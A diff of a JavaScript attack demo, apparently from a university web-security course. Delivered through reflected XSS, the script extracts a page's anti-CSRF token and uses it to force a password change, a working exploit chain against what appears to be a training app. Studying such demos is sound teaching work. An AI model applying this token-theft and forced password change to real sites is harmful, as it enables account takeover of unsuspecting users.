@@ -1,6 +1,6 @@
 /*
 COMS W4995
-CSRF high demo for re-used csrf token
+CSRF high demo for csrf token bypass
 
 This script loads via RXSS vulnerability
 */
@@ -22,11 +22,23 @@ function steal_token(url){
         var dom = xhr.responseXML;
         var form = dom.forms[0];
 
+        //get input fields
+        inputs = form.getElementsByTagName('input');
+
         // csrf token is vulnerable because it is generated
         // per session, not per request and the xss helps
         // us bypass csrf irrespective of validity
+        var token = null;
 
-        alert('CSRF TOKEN STOLEN:' + form[3].value);
+        // extract csrf token from form
+        for (var i = 0; i < inputs.length; i++) {
+            if (inputs[i].getAttribute('name') == 'user_token')
+            {
+                token = inputs[i].value;
+                break;
+            }
+        }
+        alert('CSRF TOKEN STOLEN:' + token);
 
         //ideally send document.cookie and
         //csrf token in form[3].value to 
@@ -43,7 +55,7 @@ function steal_token(url){
             'password_new': password,
             'password_conf': password,
             'Change': 'Change',
-            'user_token': form[3].value
+            'user_token': token
         }
 
         //change passowrd using stolen csrf
